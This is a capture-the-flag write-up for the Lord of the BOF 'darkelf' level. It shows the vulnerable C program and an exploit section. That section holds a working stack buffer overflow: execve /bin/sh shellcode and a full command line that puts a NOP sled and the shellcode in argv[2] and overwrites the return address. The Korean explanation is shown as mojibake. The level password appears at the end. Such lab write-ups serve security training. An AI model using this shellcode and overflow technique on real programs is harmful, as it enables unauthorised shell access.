---
title: "[LOB]Level06. darkelf"
tags: [Wargame, LOB, Write-up]
article_header:
  type: cover
  image:
    src: 
---

## keyword : check length of argv[1] + egghunter + bufferhunter

```c
/*
        The Lord of the BOF : The Fellowship of the BOF
        - darkelf
        - egghunter + buffer hunter + check length of argv[1]
*/

#include <stdio.h>
#include <stdlib.h>

extern char **environ;

main(int argc, char *argv[])
{
	char buffer[40];
	int i;

	if(argc < 2){
		printf("argv error\n");
		exit(0);
	}

	// egghunter
	for(i=0; environ[i]; i++)
		memset(environ[i], 0, strlen(environ[i]));

	if(argv[1][47] != '\xbf')
	{
		printf("stack is still your friend.\n");
		exit(0);
	}

	// check the length of argument
	if(strlen(argv[1]) > 48){
		printf("argument is too long!\n");
		exit(0);
	}

	strcpy(buffer, argv[1]);
	printf("%s\n", buffer);

    // buffer hunter
    memset(buffer, 0, 40);
}
```



------



### 0x01. Analysis



argv[1]ì˜ í¬ê¸°ê°€ 48ë³´ë‹¤ í¬ë©´ ì•ˆëœë‹¤.

í•´ë‹¹ ë¬¸ì œ argv[1]ì˜ í¬ê¸°ë¥¼ ì œí•œí•˜ê³  ìˆìœ¼ë‹ˆ argv[2]ì— ë„£ìœ¼ë©´ ë ì•„ë‹Œê°€? ğŸ˜



------



### 0x02. Exploit



```
shell(24byte) = \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80
```

argv[2]ì— NOPìŠ¬ë¼ì´ë“œì™€ ì‰˜ì½”ë“œë¥¼ ë„£ê¸° ìœ„í•´ coreë¤í”„ë¥¼ í†µí•´ í•´ë‹¹ ì£¼ì†Œë¥¼ êµ¬í•´ì˜¤ì.



<img src="http://eliez3r.synology.me/assets/img/writeup/lob/06.darkelf/image-20180829014308881.png" width="700px">



<img src="http://eliez3r.synology.me/assets/img/writeup/lob/06.darkelf/image-20180829015830365.png" width="600px">

argv[2]ì˜ ì£¼ì†ŒëŠ” 0xbffffbdeë¡œ í™•ì¸ë˜ì—ˆë‹¤.



<img src="http://eliez3r.synology.me/assets/img/writeup/lob/06.darkelf/image-20180829014955949.png" width="700px">



```
./darkelf `python -c 'print "A"*44+"\xde\xfb\xff\xbf"'` `python -c 'print "\x90"*50+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"'`
```



**darkelf / kernel crashed**